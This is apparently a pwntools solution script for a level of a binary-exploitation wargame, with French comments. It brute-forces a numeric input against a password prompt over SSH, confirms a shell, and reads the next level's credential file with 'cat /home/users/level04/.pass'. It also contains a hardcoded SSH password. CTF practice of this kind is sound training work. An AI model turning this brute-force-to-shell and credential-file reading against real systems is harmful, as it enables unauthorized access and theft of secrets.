#!/usr/bin/env python3
from pwn import *
import base64
import os

from pwnlib.adb import shell

# Configuration
context.arch = 'i386'  # Architecture du binaire (32-bit)
context.log_level = 'info'  # Niveau de log (debug, info, warning, error)

# Variables pour la connexion
LOCAL = False  # Mettre à False pour l'exploitation SSH
HOST = "localhost"  # Hôte pour SSH
PORT = 8881  # Port pour SSH
USER = "level03"  # Nom d'utilisateur SSH
PASSWORD = "Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H"  # Mot de passe SSH
SSH_SESSION = None


def get_connection(custom_env=None, argv=None):
    global SSH_SESSION
    # Fonction helper pour fusionner les environnements
    def merge_env(base_env, custom_env):
        if custom_env:
            base_env.update(custom_env)
        return base_env

    if LOCAL:
        # En local, on utilise l'environnement actuel comme base
        SSH_SESSION = None
        local_env = os.environ.copy()
        final_env = merge_env(local_env, custom_env)
        final_argv = argv if argv is not None else ['./Resources/' + USER]
        return process(final_argv, env=final_env)
    else:
        shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
        SSH_SESSION = shell
        # Récupérer l'environnement distant
        remote_env = shell.run('env').recvall().decode().strip()
        # Convertir l'output en dictionnaire
        remote_env_dict = dict(line.split('=', 1) for line in remote_env.split('\n') if '=' in line)

        # Fusionner avec nos variables personnalisées 
        final_env = merge_env(remote_env_dict, custom_env)
        final_argv = argv if argv is not None else ['/home/users/' + USER + '/' + USER]
        log.info(f"Final argv: {final_argv}")
        return shell.process(final_argv, env=final_env)


def exploit():

    for i in range(1, 22):
        payload = str(322424845 - i).encode()
        conn = get_connection()

        print(f"\n=== Tentative {i}: Payload = {payload} ===")
        conn.recvuntil(b':')
        conn.sendline(payload)

        try:
            # Utiliser recvrepeat() pour recevoir toutes les données disponibles
            # avec un timeout raisonnable
            recv = conn.recvrepeat(timeout=1).decode()
            print(f"Réponse: {recv}")
            
            if "Invalid Password" in recv:
                print(f"❌ Invalid Password pour {payload}")
                conn.close()
                continue
            
            # Vérifier qu'on n'a pas d'erreur et qu'on a bien un shell
            # Tester en envoyant une commande simple
            print(f"\n🔍 Test du shell avec le payload: {payload} (322424845 - {i})")
            conn.sendline(b'echo SHELL_TEST')
            test_response = conn.recvrepeat(timeout=1).decode()
            print(f"Test response: {test_response}")
            
            if "SHELL_TEST" in test_response:
                print(f"\n✅ Shell confirmé avec le payload: {payload}")
                
                if not LOCAL:
                    conn.sendline(b'cat /home/users/level04/.pass')
                    flag = conn.recvrepeat(timeout=1).decode()
                    print("\n=== Flag ===")
                    print(flag.strip())
                
                conn.interactive()
                break  # Sortir de la boucle si succès
            else:
                print(f"❌ Pas de shell pour {payload}")
                conn.close()
                continue

        except EOFError:
            print("EOFError - Connexion fermée")
            conn.close()
        except Exception as e:
            print(f"Erreur: {e}")
            conn.close()



   
if __name__ == "__main__":
    exploit()




